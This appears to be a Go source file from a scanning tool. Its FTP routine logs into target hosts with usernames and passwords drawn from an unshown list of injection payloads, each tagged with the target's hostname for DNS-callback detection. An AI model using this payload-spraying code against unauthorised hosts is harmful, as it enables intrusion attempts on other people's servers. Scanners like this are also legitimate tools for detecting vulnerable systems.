package main

import (
	"fmt"
	"math/rand"
	"strings"
	"sync"
	"time"

	"github.com/jlaffaye/ftp"
)

func (p *ProcJob) ProcessHostFTP(port string, wg *sync.WaitGroup) error {
	var host string
	if len(port) < 1 {
		host = p.Host
	} else {
		host = fmt.Sprintf("%s:%s", p.Host, port)
	}

	defer wg.Done()
	thisTime := time.Now()
	fmt.Printf("\r%d/%02d/%02d %02d:%02d:%02d Total processed: %d  |  Current: %s  |  Protocol: %s",
		thisTime.Year(), thisTime.Month(), thisTime.Day(), thisTime.Hour(),
		thisTime.Minute(), thisTime.Second(), procCount, host, p.Protocol)

	procCount++

	var dynamicPayloads []string
	sanitisedDnsName := strings.ReplaceAll(host, ".", "-")
	sanitisedDnsName = strings.ReplaceAll(sanitisedDnsName, ":", "-")
	sanitisedDnsName = strings.ReplaceAll(sanitisedDnsName, "/", "-")
	for _, payload := range xload {
		dynamicPayloads = append(dynamicPayloads, strings.ReplaceAll(payload, "$DNSNAME$", sanitisedDnsName))
	}

	xc := make(chan bool, 1)
	go func() {
		c, err := ftp.Dial(host, ftp.DialWithTimeout(3*time.Second))
		if err != nil {
			return
		}
		username := dynamicPayloads[rand.Intn(len(dynamicPayloads))]
		password := dynamicPayloads[rand.Intn(len(dynamicPayloads))]

		err = c.Login(username, password)
		if err != nil {
			return
		}
		if err = c.Quit(); err != nil {
			return
		}
		xc <- true
	}()
	select {
	case <-xc:
		time.Sleep(time.Duration(delay) * time.Second)
		return nil
	case <-time.After(3 * time.Second):
		return fmt.Errorf("timeout during ftp dial / login")
	}
}
